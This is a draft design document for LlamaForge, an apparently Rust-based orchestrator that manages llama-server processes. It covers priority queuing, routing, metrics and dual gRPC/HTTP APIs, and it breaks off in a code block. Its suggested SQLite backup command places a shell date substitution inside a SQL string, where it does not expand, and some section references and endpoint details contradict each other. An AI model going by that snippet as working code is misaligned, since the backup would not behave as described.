# LlamaForge — Design Document

## llama.cpp Server Orchestration, Request Queue, and Metrics Platform

**Version:** 0.1.0-draft-r4  
**Author:** Sumanth Gottipati  
**Date:** 2026-04-27  
**Status:** Design Phase (post-adversarial review revision 4)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Goals and Non-Goals](#2-goals-and-non-goals)
3. [Related Work & Positioning](#3-related-work--positioning)
   - 3.1 [Why Not vLLM?](#31-why-not-vllm)
   - 3.2 [Comparison with Other Tools](#32-comparison-with-other-tools)
   - 3.3 [Positioning Summary](#33-positioning-summary)
4. [System Architecture Overview](#4-system-architecture-overview)
   - 4.1 [Failure Boundaries & Durability Guarantees](#41-failure-boundaries--durability-guarantees)
5. [Component Deep Dives](#5-component-deep-dives)
   - 5.1 [Transport Layer (Dual-Protocol Gateway)](#51-transport-layer-dual-protocol-gateway)
   - 5.2 [Request Queue & Scheduler](#52-request-queue--scheduler)
   - 5.3 [Server Manager (Process Lifecycle)](#53-server-manager-process-lifecycle)
   - 5.4 [Metrics Collector & Aggregator](#54-metrics-collector--aggregator)
   - 5.5 [Config Manager & Web UI](#55-config-manager--web-ui)
   - 5.6 [Audit Log & Event Store](#56-audit-log--event-store)
6. [Data Models](#6-data-models)
7. [API Specification](#7-api-specification)
8. [Request Lifecycle](#8-request-lifecycle)
9. [Priority System & Eviction](#9-priority-system--eviction)
10. [Smart Routing Strategy](#10-smart-routing-strategy)
11. [Metrics & Observability](#11-metrics--observability)
12. [Technology Stack](#12-technology-stack)
13. [Database Abstraction Layer](#13-database-abstraction-layer)
14. [Deployment Architecture](#14-deployment-architecture)
15. [Multi-Node Evolution Path](#15-multi-node-evolution-path)
16. [Security Model](#16-security-model)
17. [Failure Modes & Recovery](#17-failure-modes--recovery)
18. [Testing Strategy](#18-testing-strategy)
19. [Open Questions & Future Work](#19-open-questions--future-work)

---

## 1. Executive Summary

LlamaForge is an orchestration layer that sits between clients and one or more `llama-server` instances. Its **primary API is gRPC** (Protocol Buffers over HTTP/2), with a thin HTTP/JSON shim layer for OpenAI and Anthropic SDK backward compatibility. It provides strongly-typed request metadata (request_id, task_type, requestor, priority) via protobuf, a priority-aware request queue with queue-level preemption, per-request and aggregated metrics (TTFT, tokens/s, throughput, goodput), intelligent request routing, and a web interface for configuration management.

Think of it as an orchestration layer similar in spirit to LiteLLM's role for cloud APIs — but where LiteLLM translates and routes to remote endpoints, LlamaForge owns the full stack: spawning and managing local `llama-server` processes, scheduling requests across them with priority-aware queuing, and providing deep per-request observability that is only possible when you control the inference hardware. gRPC's native server-side streaming is a natural fit for token-by-token generation, and future bidirectional streaming opens the door to interactive protocols (queue position updates interleaved with generated tokens on a single stream).

The system is written in Rust for performance and reliability, using `tonic` as the gRPC framework. It starts as a single-machine orchestrator and is architected to evolve into a multi-node cluster manager.

---

## 2. Goals and Non-Goals

### Goals

- **G1: Process Lifecycle Management.** Spawn, configure, monitor, restart, and gracefully shut down `llama-server` processes. Expose all server flags (context size, GPU layers, parallel slots, batch sizes, KV cache types, flash attention, etc.) through a configuration interface.

- **G2: gRPC-Primary Unified Client API.** The primary API is a gRPC service defined in Protocol Buffers, with strongly-typed request/response messages carrying `request_id`, `task_type`, `requestor`, `model_name`, and `priority` as first-class fields. A thin HTTP/JSON shim (purpose-built axum translation layer) provides OpenAI-compatible `/v1/chat/completions` and `/v1/completions` endpoints and Anthropic-compatible `/v1/messages` for backward compatibility with existing SDKs. The Web UI management surface remains REST/JSON served by `axum`. Optional grpc-web support (via `tonic-web`) is available for browser-based gRPC clients but is not involved in the JSON translation path.

- **G3: Priority Queue with Queue-Level Preemption.** Requests enter a priority queue ordered by computed effective priority. Higher-priority requests jump ahead of lower-priority queued requests. In v1, in-flight requests run to completion — there is no mid-generation eviction. Prefill-only eviction is planned for v2 (see Section 9.3). Clients receive queue position and ETA updates via SSE or gRPC streaming.

- **G4: Per-Request Metrics.** Every request produces a metrics record: time-to-first-token (TTFT), tokens per second (generation throughput), total latency, prompt tokens, completion tokens, queue wait time, eviction count, and which server/slot served it.

- **G5: Aggregated Metrics & Dashboards.** SQLite stores the per-request audit trail. Prometheus endpoint exports operational counters and gauges. Built-in web UI shows real-time dashboards.

- **G6: Smart Routing.** Route requests to the optimal `llama-server` instance based on model affinity, current slot availability, KV cache state, and prompt prefix cache affinity. LlamaForge maximizes the efficiency of `llama-server`'s built-in continuous batching by making intelligent routing decisions at the orchestrator level.

- **G7: Web Configuration UI.** Browser-based interface for managing server instances, model assignments, KV cache settings, parallelism, and viewing real-time metrics and queue state.

### Non-Goals (for v1)

- **NG1:** Model training or fine-tuning. (Note: LoRA adapter routing and lifecycle management is a v1 feature — see server config and routing algorithm.)
- **NG2:** Distributed tensor parallelism across nodes (RPC tensor split). Multi-node request routing is a v2 evolution target (see Section 15).
- **NG3:** Model format conversion (GGUF conversion is out of scope — use existing llama.cpp tooling).
- **NG4:** Authentication/authorization beyond API key validation. No RBAC in v1.
- **NG5:** Automatic model downloading or Hugging Face Hub integration.
- **NG6:** Semantic request caching or deduplication. Identical requests are processed independently. Response caching is a v2 consideration.
- **NG7:** Chat session or conversation state management. LlamaForge is stateless per-request — clients must send full conversation context on each call.
- **NG8:** Output filtering, content moderation, or guardrails. LlamaForge passes model output to clients unmodified.

---

## 3. Related Work & Positioning

LlamaForge occupies a specific niche in the LLM serving landscape. Understanding where it sits relative to existing tools clarifies both its value proposition and its deliberate trade-offs.

### 3.1 Why Not vLLM?

vLLM is the closest architectural competitor and the default recommendation for high-throughput LLM serving. It provides iteration-level batching (the scheduler controls which requests participate in each forward pass), PagedAttention for fine-grained KV cache management, automatic prefix caching, preemptive eviction (swap to CPU or recompute), Prometheus metrics, and an OpenAI-compatible API.

**What LlamaForge gives up vs. vLLM:**

- **Iteration-level batching control.** vLLM's scheduler operates *inside* the inference engine, making batching decisions at each decode step. LlamaForge's scheduler is *external* — it routes whole requests to `llama-server` slots and delegates batching to `llama-server`'s built-in continuous batching. This means LlamaForge can never match vLLM's batching efficiency at high concurrency, because it operates at a coarser scheduling granularity.
- **PagedAttention.** vLLM manages KV cache memory with virtual-memory-style block-table paging, mapping virtual blocks to physical blocks on demand for near-zero fragmentation. llama.cpp uses a **unified contiguous KV cache** — a single shared buffer across all sequences where the sum of all tokens across slots must not exceed `n_parallel × n_ctx`. This is simpler but more prone to fragmentation. llama.cpp does not implement PagedAttention (the tracking issue [ggml-org/llama.cpp#1955](https://github.com/ggml-org/llama.cpp/issues/1955) remains open). However, LlamaForge can mitigate this at the orchestrator level through cache-aware slot assignment and explicit slot cache lifecycle management (see Section 10).
- **In-flight preemption.** vLLM can swap or recompute evicted requests mid-generation. LlamaForge v1 provides queue-only preemption (see Section 9.2).

**What LlamaForge provides that vLLM does not:**

- **Native llama.cpp / GGUF ecosystem.** vLLM can load GGUF weights but uses its own CUDA inference engine. LlamaForge wraps `llama-server` natively, preserving the full llama.cpp feature set including all quantization formats (Q4_K_M, Q5_K_S, IQ types, etc.), FlashAttention (CUDA, Metal, and CPU via `--flash-attn auto|on|off`), Metal acceleration, and community-contributed optimizations.
- **Orchestrator-level cache control.** While LlamaForge cannot control within-batch scheduling, it exposes llama-server's slot-level control surfaces to users: `id_slot` pinning for cache-aware request placement, per-request `cache_prompt` toggling, and slot KV cache lifecycle management (erase, save to disk, restore from disk). These enable orchestrator-driven cache strategies that bare llama-server cannot coordinate across multiple instances (see Section 10).
- **Apple Silicon / Metal support.** vLLM requires NVIDIA GPUs (CUDA). LlamaForge runs on Apple Silicon via llama.cpp's Metal backend — a hard requirement for many local deployment scenarios.
- **Multi-model orchestration.** vLLM runs one model per process. LlamaForge manages multiple `llama-server` instances (potentially with different models) from a single orchestrator, with unified routing, metrics, and lifecycle management.
- **Single-binary deployment.** LlamaForge ships as a single Rust binary with no Python dependencies, no CUDA toolkit requirements (beyond what `llama-server` needs), and no container runtime requirement. vLLM requires Python, CUDA extensions, and typically Docker.
- **Web UI for configuration.** LlamaForge provides a browser-based interface for managing server instances, model assignments, and viewing metrics. vLLM has no built-in UI.
- **gRPC-primary API.** LlamaForge's primary API is gRPC with strongly-typed protobuf messages, providing native streaming and rich metadata. vLLM exposes only an OpenAI-compatible REST API.

**Why the external scheduling trade-off is acceptable:** LlamaForge targets a different deployment profile than vLLM. Where vLLM optimizes for maximum throughput on datacenter GPUs, LlamaForge optimizes for operational simplicity, hardware diversity (consumer GPUs, Apple Silicon, CPU-only), and the ability to orchestrate an existing battle-tested inference engine (`llama-server`) rather than reimplementing one. For deployments running 1–8 GPU local setups with quantized models, the routing-level scheduling overhead is negligible compared to the operational benefits of wrapping `llama-server` directly. Furthermore, llama-server exposes meaningful control surfaces — `id_slot` for slot pinning, `cache_prompt` for per-request cache reuse, and slot-level KV cache save/restore/erase — that allow LlamaForge to implement cache-aware routing strategies at the orchestrator level, recovering much of the practical benefit of tighter integration without reimplementing the inference engine.

### 3.2 Comparison with Other Tools

| Capability | vLLM | LiteLLM | TGI | Bare llama-server | **LlamaForge** |
|------------|------|---------|-----|--------------------|----------------|
| Scheduler | Iteration-level | None (proxy) | Iteration-level | Per-slot FCFS | External routing + slot pinning |
| KV cache mgmt | PagedAttention | N/A | Paged | Unified contiguous | Orchestrated (slot pin + cache lifecycle) |
| FlashAttention | Yes | N/A | Yes | Yes (auto/on/off) | Yes (exposed via config) |
| Apple Silicon | No | N/A (proxy) | No | Yes | Yes |
| GGUF native | Partial | N/A | No | Yes | Yes |
| Multi-model | No | Yes (routing) | No | No | Yes |
| Priority queue | Yes | No | No | No | Yes |
| Cache control API | No | No | No | erase/save/restore | erase/save/restore + cross-instance routing |
| Process lifecycle | No | No | No | N/A | Yes |
| Web UI | No | Yes | No | No | Yes |
| gRPC API | No | No | No | No | Yes |
| Deployment | Python+CUDA | Python | Python+CUDA | Single binary | Single binary |

### 3.3 Positioning Summary

LlamaForge is for teams that want production-grade orchestration of `llama-server` — priority scheduling, deep observability, multi-model management, and process lifecycle control — without abandoning the llama.cpp ecosystem or requiring NVIDIA datacenter hardware. If you need maximum throughput on NVIDIA GPUs and are willing to adopt vLLM's runtime, vLLM is likely the better choice. If you need llama.cpp's hardware coverage, quantization ecosystem, or operational simplicity, LlamaForge provides the orchestration layer that `llama-server` lacks.

---

## 4. System Architecture Overview

```
┌──────────────────────────────────────────────────────────────────────────┐
│                           CLIENT LAYER                                    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐         │
│  │ gRPC     │  │ OpenAI / │  │ CLI      │  │ Web UI           │         │
│  │ Client   │  │ Anthropic│  │ Tool     │  │ (Config/Metrics) │         │
│  │ (native) │  │ SDK      │  │ (gRPC)   │  │ (REST/JSON)      │         │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘         │
└───────┼──────────────┼──────────────┼──────────────────┼─────────────────┘
        │ gRPC/H2      │ HTTP/JSON    │ gRPC/H2          │ HTTP/JSON
        ▼              ▼              ▼                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                       LLAMAFORGE CORE (Rust)                              │
│                                                                           │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │               TRANSPORT LAYER (dual-protocol)                      │  │
│  │  ┌────────────────────────────┐  ┌──────────────────────────┐     │  │
│  │  │   gRPC Server (tonic)      │  │  HTTP Server (axum)      │     │  │
│  │  │   :50051                   │  │  :8000                   │     │  │
│  │  │                            │  │                          │     │  │
│  │  │  • InferenceService        │  │  • OpenAI+Anthropic /v1  │     │  │
│  │  │  • QueueService            │  │  • Mgmt API /api/*       │     │  │
│  │  │  • ServerMgmtService       │  │  • Prometheus /metrics   │     │  │
│  │  │  • MetricsService          │  │  • Web UI /ui/*          │     │  │
│  │  └────────────┬───────────────┘  └────────────┬─────────────┘     │  │
│  │               └──────────┬────────────────────┘                   │  │
│  │                          │ (both call into same core logic)       │  │
│  └──────────────────────────┼────────────────────────────────────────┘  │
│                             ▼                                           │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │                    ORCHESTRATION LAYER                            │   │
│  │                                                                  │   │
│  │  ┌──────────────────┐  ┌──────────────────┐  ┌───────────────┐  │   │
│  │  │ REQUEST QUEUE    │  │ DISPATCH TRACKER │  │ SLOT DISPATCH │  │   │
│  │  │ & SCHEDULER      │  │ (per-server)     │  │ MAP           │  │   │
│  │  │                  │  │                  │  │               │  │   │
│  │  │ • Priority Queue │  │ • Arc<Mutex<     │  │ HashMap<      │  │   │
│  │  │ • Queue Timeout  │  │   HashSet>> (v1) │  │ (ServerId,    │  │   │
│  │  │ • Queue Position │  │ • Stale-slot     │  │  SlotId),     │  │   │
│  │  │ • Admission Ctrl │  │   compensation   │  │  RequestId>   │  │   │
│  │  │ • Routing Score  │  │ • RAII Dispatch-  │  │ • Orphan slot │  │   │
│  │  │   (Section 10.2) │  │   Token guard    │  │   recovery    │  │   │
│  │  │                  │  │                  │  │ • Reverse     │  │   │
│  │  │                  │  │                  │  │   reconcil.   │  │   │
│  │  └────────┬─────────┘  └────────┬─────────┘  └───────┬───────┘  │   │
│  │           │                     │                     │          │   │
│  │           ▼                     ▼                     ▼          │   │
│  │  ┌──────────────────────────────────────────────────────────┐    │   │
│  │  │              PROXY TASK (per-request, Tokio task)         │    │   │
│  │  │                                                          │    │   │
│  │  │  • Holds HTTP connection to llama-server /completion     │    │   │
│  │  │  • Streams tokens back to client (SSE or gRPC stream)   │    │   │
│  │  │  • Owns DispatchToken (RAII slot accounting)             │    │   │
│  │  │  • Captures per-request metrics (TTFT, TPS, latency)    │    │   │
│  │  │  • Handles client disconnect → upstream cancellation     │    │   │
│  │  │  • Sets id_slot for cache-aware slot pinning             │    │   │
│  │  └──────────────────────────┬───────────────────────────────┘    │   │
│  │                             │ (DATA PLANE: HTTP POST             │   │
│  │                             │  /completion with id_slot,         │   │
│  │                             │  cache_prompt)                     │   │
│  └─────────────────────────────┼────────────────────────────────────┘   │
│                                │                                        │
│  ┌─────────────────┐  ┌───────┼────────────┐  ┌────────────────────┐   │
│  │ CONFIG MANAGER  │  │ SERVER MANAGER     │  │ METRICS COLLECTOR  │   │
│  │                 │  │                    │  │ & AGGREGATOR       │   │
│  │ • llamaforge.   │  │ • Process spawn/  │  │                    │   │
│  │   toml          │  │   kill/restart    │  │ • Per-request ◄────┼───┐
│  │ • priority_     │  │ • VRAM Reserv.    │  │   (from proxy task)│   │
│  │   rules.toml   │  │   Ledger          │  │ • Prometheus       │   │
│  │ • Live reload   │  │   Arc<Mutex<      │  │   counters/gauges  │   │
│  │ • Validate      │  │   HashMap<GpuId,  │  │ • Ring buffer      │   │
│  │ • Web UI        │  │   u64>>>          │  │   (hot, 5 min)     │   │
│  │   writeback     │  │ • Model↔Server    │  │ • SQLite sink      │   │
│  │                 │  │   affinity        │  │   (warm/cold)      │   │
│  └─────────────────┘  └───────┬────────────┘  └─────────┬──────────┘   │
│                               │                         │              │
│                               │ CONTROL PLANE:          │              │
│                               │ GET /health (2s)        │              │
│                               │ GET /slots  (5s)        │              │
│                               │ GET /metrics(10s)       │              │
│                               │ POST /slots/{id}?       │              │
│                               │   action=erase|save|    │              │
│                               │   restore               │              │
│                               │                         │              │
│  ┌────────────────────────────┴─────────────────────────┴──────────┐   │
│  │           AUDIT LOG & EVENT STORE (SQLite + WAL)                 │   │
│  │  ┌─────────────────────────┐  ┌──────────────────────────────┐  │   │
│  │  │ Writer Thread           │  │ Read Pool (deadpool-sqlite)  │  │   │
│  │  │ (dedicated, serialized) │  │ (concurrent HTTP queries)    │  │   │
│  │  └─────────────────────────┘  └──────────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────────────┘
        ┃ DATA PLANE              ║ CONTROL PLANE
        ┃ (per-request            ║ (Server Manager
        ┃  proxy task →           ║  polls health/
        ┃  /completion)           ║  slots/metrics)
        ▼                         ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                         INFERENCE LAYER                                    │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐                 │
│  │ llama-server  │  │ llama-server  │  │ llama-server  │   ...           │
│  │ :8081         │  │ :8082         │  │ :8083         │                 │
│  │ Model A       │  │ Model B       │  │ Model A       │                 │
│  │ 4 slots       │  │ 8 slots       │  │ 4 slots       │                 │
│  │ GPU 0         │  │ GPU 1         │  │ GPU 2         │                 │
│  │ --flash-attn  │  │ --flash-attn  │  │ --flash-attn  │                 │
│  │   auto        │  │   auto        │  │   auto        │                 │
│  └───────────────┘  └───────────────┘  └───────────────┘                 │
└──────────────────────────────────────────────────────────────────────────┘
```

**Reading the diagram — data plane vs. control plane:**

The diagram shows two distinct communication paths between LlamaForge and the Inference Layer:

- **Data plane (━ thick lines):** When the Scheduler dispatches a request, it spawns a **Proxy Task** — a per-request Tokio task that opens a direct HTTP connection to the target `llama-server`'s `/completion` endpoint. Tokens stream back through this connection to the client. The Proxy Task owns a `DispatchToken` (RAII guard) for slot accounting and sets `id_slot` for cache-aware pinning. Orphan tracking uses `id_slot` as the primary correlation key, with `id_task` observed from `/slots` responses as a secondary fallback. This is the performance-critical path — the Server Manager does not intermediate data-plane traffic.

- **Control plane (║ double lines):** The Server Manager independently polls each `llama-server` instance for lifecycle management and routing state: `GET /health` every 2 seconds, `GET /slots` every 5 seconds, and `GET /metrics` every 10 seconds. It also issues `POST /slots/{id}?action=erase|save|restore` for slot cache lifecycle management. The `/slots` response feeds back into the Scheduler's routing score and the Dispatch Tracker's reconciliation logic.

**Key coordination structures shown in the diagram:**

| Structure | Location | Purpose |
|-----------|----------|---------|
| **Dispatch Tracker** | Per-server, between Scheduler and Proxy Task | Compensates for stale `/slots` data between polling intervals. Prevents routing dogpiles. Uses RAII `DispatchToken` for leak-free accounting. |
| **Slot Dispatch Map** | Shared across Proxy Tasks | `HashMap<(ServerId, SlotId), (RequestId, Instant)>` — maps server+slot pairs to in-flight LlamaForge requests and their dispatch timestamp. The `dispatched_at` timestamp provides a 10-second grace period in the forward reconciliation pass to avoid reaping entries during the dispatch-to-slot transition window. Primary correlation key for orphan slot recovery. `id_task` values from `/slots` responses provide secondary correlation when `id_slot` was auto-assigned. |
| **VRAM Reservation Ledger** | Inside Server Manager | `Arc<Mutex<HashMap<GpuId, u64>>>` — prevents concurrent spawn TOCTOU races by reserving VRAM before process launch completes. |
| **Proxy Task** | Per-request Tokio task | The actual data plane. Holds the HTTP connection, streams tokens, manages the `DispatchToken`, captures metrics, handles cancellation. |
| **priority_rules.toml** | Config Manager (separate from `llamaforge.toml`) | Separate config file with its own schema, reload semantics, and Web UI writeback behavior. |
| **Writer Thread / Read Pool** | SQLite layer (behind `MetricsStore` trait) | Dedicated writer thread for serialized mutations (receives `WriterCommand` via mpsc, returns results via oneshot); `deadpool-sqlite` connection pool for concurrent HTTP read queries. The writer thread is an implementation detail of `SqliteMetricsStore` — the batch collector calls the async `MetricsStore::insert_events()` trait method, which bridges to the writer thread internally. |

### 4.1 Failure Boundaries & Durability Guarantees

LlamaForge v1 is a single-binary orchestrator. This section explicitly documents what survives a crash and what does not, so that operators and client developers can design appropriate resilience strategies.

**Ephemeral state (lost on gateway crash):**

| Component | What's Lost | Impact | Mitigation |
|-----------|-------------|--------|------------|
| **Priority queue** | All queued (not yet dispatched) requests | Clients receive TCP connection resets with no structured error. Queued requests are silently dropped. | **Clients must implement retry logic.** LlamaForge provides request IDs — clients should use idempotency keys to detect and retry dropped requests. The queue is intentionally not persisted: WAL-fsyncing every enqueue would add ~1ms latency to every request for durability that most v1 deployments don't need. |
| **In-memory metrics ring buffer** | Last 5 minutes of hot metrics (P50/P95/P99 window) | Real-time percentile calculations reset. Prometheus counters reset to zero (standard behavior, handled by `rate()` in PromQL). | Warm storage in SQLite survives (assuming WAL was checkpointed). Historical metrics and audit records are preserved. Only the hot aggregation window is lost. |
| **Dispatch Tracker state** | Per-server dispatch counts and tracked request IDs | On restart, the Scheduler has no knowledge of requests dispatched just before the crash. | The `/slots` polling loop rebuilds accurate slot state within one polling cycle (5 seconds). Orphan recovery (Section 14) reclaims any llama-server slots that were occupied by pre-crash requests. |
| **Slot Dispatch Map** | (ServerId, SlotId) → RequestId mappings | Orphan slot recovery falls back to prompt-prefix matching on `/slots` response instead of slot-based correlation. | Slightly slower orphan detection but functionally equivalent. The reverse reconciliation pass (Section 10.2) erases orphaned slots within one cycle regardless. |

**Persistent state (survives crash):**

| Component | Durability | Notes |
|-----------|-----------|-------|
| **SQLite audit log** | Durable (WAL mode, `synchronous = NORMAL`) | Per-request metrics records, event history, and configuration snapshots survive crashes. `synchronous = NORMAL` means the last few transactions before a crash may be lost if the OS crashes (not just the process). |
| **llama-server processes** | Survive as orphans | Child `llama-server` processes are not killed by a LlamaForge crash — they continue running. The orphan recovery protocol (Section 14) reclaims them on restart via PID file + process group matching. During the recovery window (crash → restart → orphan reclaim → health check pass), all client requests fail. |
| **Configuration files** | On-disk TOML | `llamaforge.toml` and `priority_rules.toml` are not modified by a crash. Web UI writeback operations use atomic rename (`write` → `rename`) to prevent partial writes. |

**Single points of failure:**

The LlamaForge gateway binary is a SPOF. If it crashes, all coordination is lost and clients experience connection drops until it restarts. This is acceptable at v1 scale for three reasons: (1) `systemd` or Docker restart policies bring the gateway back within seconds, (2) orphan recovery reclaims child processes automatically, and (3) the alternative (multi-node consensus) would add orders of magnitude more complexity for a system targeting 1–8 GPU local deployments.

**SQLite backup recommendation:** SQLite with WAL mode is appropriate for v1 scale, but the database file is not replicated. A corrupted or deleted database loses all historical metrics and audit data. Operators should implement periodic backup using SQLite's `VACUUM INTO` command:

```sql
-- Cron job or systemd timer, e.g., every 6 hours
VACUUM INTO '/path/to/backups/llamaforge-backup-$(date +%Y%m%d-%H%M%S).db';
```

`VACUUM INTO` creates a consistent snapshot without blocking concurrent readers or the writer thread. The backup file is a standalone SQLite database that can be queried independently.

### 4.2 How a Request Flows Through the Code

Post-Phase 9, a streaming chat-completion request touches **four crates** end to end:

| Stage | Crate | File (canonical path) | What happens |
|-------|-------|-----------------------|--------------|
| 1. HTTP receipt | `llamaforge-api` | `crates/llamaforge-api/src/transport/http.rs` | axum router accepts `POST /v1/chat/completions` (or `/v1/messages` for Anthropic). Body parsed to a domain `ChatCompletionRequest`. |
| 2. Admission + routing | `llamaforge-core` | `crates/llamaforge-core/src/queue/admission.rs`, `crates/llamaforge-core/src/queue/pipeline.rs`, `crates/llamaforge-core/src/routing/router.rs` | Admission controller checks per-requestor concurrency, priority rules, queue depth. Scheduler loop picks the request and asks the router to pick a server (slot availability + KV-cache affinity). |
| 3. Dispatch | `llamaforge-api` | `crates/llamaforge-api/src/dispatch/dispatcher.rs`, `crates/llamaforge-api/src/dispatch/client.rs` | Dispatcher posts to the chosen `llama-server`'s `/v1/chat/completions` via `ReqwestClientStore`, then streams tokens back to the client connection from stage 1. |
| 4. Backend | `llamaforge-server` for lifecycle; `mock-llama` or external `llama-server` as the subprocess | `crates/llamaforge-server/src/manager.rs` (supervision) | The supervised backend emits SSE tokens upstream; the dispatcher forwards them through. |

`llamaforge-metrics` sits on the side: every stage emits TTFT, tokens/sec, queue-depth, and audit events into a SQLite-backed pipeline behind the `MetricsStore` trait. Reading metrics is not on the hot path.

Pre-Phase 9 the same trace passed through **seven** crates (`transport` → `adapters/inference_engine` → `adapters/queue` → `queue` → `routing` → `dispatch` → `types`). Issue #154 — "the new-hire test" — was the structural-pressure finding that drove the consolidation: four files to follow a request instead of seven.

---

## 5. Component Deep Dives

### 5.1 Transport Layer (Dual-Protocol Gateway)

LlamaForge runs two listener ports from a single binary, sharing the same core logic.

**Startup requirement:** Both ports must bind successfully for LlamaForge to start. If either port fails to bind (e.g., address already in use), the process logs the specific bind error and exits with a non-zero status code. Partial startup — where one protocol is available and the other is not — is not supported, as it creates confusing operational states (e.g., Prometheus `/metrics` unreachable while inference works, or gRPC down while the HTTP shim serves requests).

**Port 50051 — gRPC Server (tonic) — Programmatic & Internal Interface**

The gRPC server is the primary interface for programmatic access, internal tooling (Web UI, CLI), and future multi-node coordination (Phase 2 worker agents reuse these protos). It exposes four services defined in Protocol Buffers:

| gRPC Service | Key RPCs | Streaming |
|-------------|----------|-----------|
| `InferenceService` | `ChatCompletion`, `TextCompletion`, `Embed`, `Rerank` | Server-side streaming for token generation; unary for Embed and Rerank |
| `QueueService` | `GetQueueStatus`, `CancelRequest`, `BoostPriority`, `WatchQueue` | Server-side streaming for queue position updates |
| `ServerMgmtService` | `ListServers`, `GetServer`, `StartServer`, `StopServer`, `RestartServer`, `ListModels`, `GetSlots` | Unary |
| `MetricsService` | `QueryRequestMetrics`, `GetAggregatedMetrics`, `WatchMetrics` | Server-side streaming for live metrics |

gRPC advantages for this use case:

- **Multiplexed streaming:** HTTP/2 allows multiple concurrent RPC streams over a single TCP connection. A client can have an active `ChatCompletion` stream and a `WatchQueue` stream simultaneously without extra connections.
- **Strongly-typed metadata:** `request_id`, `task_type`, `requestor`, and `priority` are first-class protobuf fields — no custom headers or JSON extension keys. Compile-time type safety in every client language.
- **Bidirectional streaming (future):** Opens the door to interactive protocols where the client can send cancellation or priority-boost signals mid-stream without a separate RPC.
- **Built-in deadlines:** gRPC deadlines map naturally to `queue_timeout_secs` — the client sets a deadline, and the server respects it without custom timeout logic.
- **Code generation:** `protoc` generates idiomatic client libraries for Python, Go, TypeScript, Java, C++, and more from the `.proto` files.
- **Health checking:** gRPC has a standard health checking protocol (`grpc.health.v1.Health`) which LlamaForge implements natively.

**Port 8000 — HTTP Server (axum) — Primary Client-Facing Interface & Management**

The HTTP/OpenAI-compatible API is what most users will interact with directly (via OpenAI/Anthropic Python SDKs, `curl`, or custom HTTP clients). Both transports call the same `InferenceEngine` implementation — neither is a "shim" of the other in terms of capability. The HTTP server handles two concerns:

1. **OpenAI-Compatible Shim (`/v1/*`):** Translates OpenAI-format JSON requests into internal gRPC calls, then translates streaming gRPC responses back to SSE. This is *not* a generic grpc-gateway proxy — it's a purpose-built translation layer that maps OpenAI's JSON schema to our protobuf messages and vice versa. The same shim layer also handles Anthropic Messages API compatibility via `/v1/messages`. **v1 Anthropic scope:** supports `/v1/messages` POST with text content, streaming via Anthropic SSE format (with named `event:` fields as required by the Anthropic SDK — see Section 7.2 Compatibility Note), and tool use (including streaming tool calls via buffered-then-emit mode — see "Streaming Tool Calls" in Section 7.0). Anthropic's top-level `system` field is supported by mapping it into a system message in the internal messages array before passing to the core pipeline. Does NOT support prompt caching tokens, extended thinking, or batch API. Full Anthropic parity is a v1.1 target. Both the OpenAI and Anthropic translation paths share the core request pipeline -- the shim is the only place where API-format differences are resolved.

| Endpoint | Method | Maps to gRPC |
|----------|--------|-------------|
| `/v1/chat/completions` | POST | `InferenceService.ChatCompletion` |
| `/v1/completions` | POST | `InferenceService.TextCompletion` |
| `/v1/embeddings` | POST | `InferenceService.Embed` |
| `/v1/models` | GET | `ServerMgmtService.ListModels` |
| `/v1/models/{model_id}` | GET | `ServerMgmtService.GetModel` |
| `/v1/rerank` | POST | `InferenceService.Rerank` |
| `/v1/messages` | POST | `InferenceService.ChatCompletion` (Anthropic SDK compat) |

   > **Model endpoint response format:** `/v1/models` and `/v1/models/{model_id}` return model objects whose schema matches the requesting SDK's expected format. Requests arriving via OpenAI-path endpoints receive OpenAI-format model objects (`id`, `object: "model"`, `created`, `owned_by`). Requests arriving via `/v1/messages` receive Anthropic-format model objects (`id`, `type: "model"`, `display_name`). The shim translates the internal model representation into the appropriate format based on the inbound request path. This ensures both `openai.models.list()` and `anthropic.models.retrieve(model_id)` work correctly.

   OpenAI SDK users can still pass extended metadata via headers or body `metadata` key:

| Header | Required | Description |
|--------|----------|-------------|
| `X-Request-ID` | No (auto-generated) | Maps to protobuf `request_id`. If client provides a value and it is a valid UUIDv7, it is used as-is. Otherwise, LlamaForge auto-generates a UUIDv7. Client-supplied IDs are NOT deduplicated — they are trusted for tracing/idempotency correlation only. |
| `X-Task-Type` | No (default: `general`) | Maps to protobuf `task_type` |
| `X-Requestor` | No (default: `anonymous`) | Maps to protobuf `requestor` |
| `X-Priority` | No (auto-computed) | Maps to protobuf `priority` |
| `X-Queue-Timeout` | No (default: 300s) | Maps to gRPC deadline |

2. **Management & Web UI Surface (`/api/*`, `/ui/*`, `/metrics`):**

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/servers` | GET | List all server instances |
| `/api/servers/{id}` | GET | View a specific server's status and config |
| `/api/servers/{id}/start` | POST | Start a server process |
| `/api/servers/{id}/stop` | POST | Graceful shutdown |
| `/api/servers/{id}/restart` | POST | Rolling restart |
| `/api/servers/{id}/slots` | GET | Live slot status |
| `/api/servers/{id}/lora-adapters` | GET/POST | List loaded LoRA adapters; POST to load/unload adapters at runtime (persisted to TOML — see Config Writeback below) |
| `/api/queue` | GET | Current queue state |
| `/api/queue/{request_id}` | GET/DELETE | Check or cancel a queued request |
| `/api/models` | GET | All models across all servers |
| `/api/config` | GET | Current configuration (read-only) |
| `/api/config/reload` | POST | Trigger config reload from TOML files |
| `/api/metrics/requests` | GET | Query per-request metrics from SQLite |
| `/api/metrics/aggregated` | GET | Aggregated metric summaries |
| `/api/maintenance/wal-checkpoint` | POST | Trigger SQLite WAL checkpoint (passive or truncate mode) for distroless containers |
| `/metrics` | GET | Prometheus text-format scrape endpoint |
| `/ui/*` | GET | Static SPA (Leptos WASM or htmx + Alpine.js) |

**Shared Core:** Both gRPC and HTTP handlers call into the same Rust service layer. There is no duplication of business logic — the HTTP handler is a thin translation adapter. **Implementation priority:** Ship the HTTP/OpenAI-compatible API first (blocking for SDK users), then gRPC (blocking for Web UI and advanced tooling). Both transports have full feature parity:

```rust
// The core service trait — protocol-agnostic
#[async_trait]
pub trait InferenceEngine: Send + Sync {
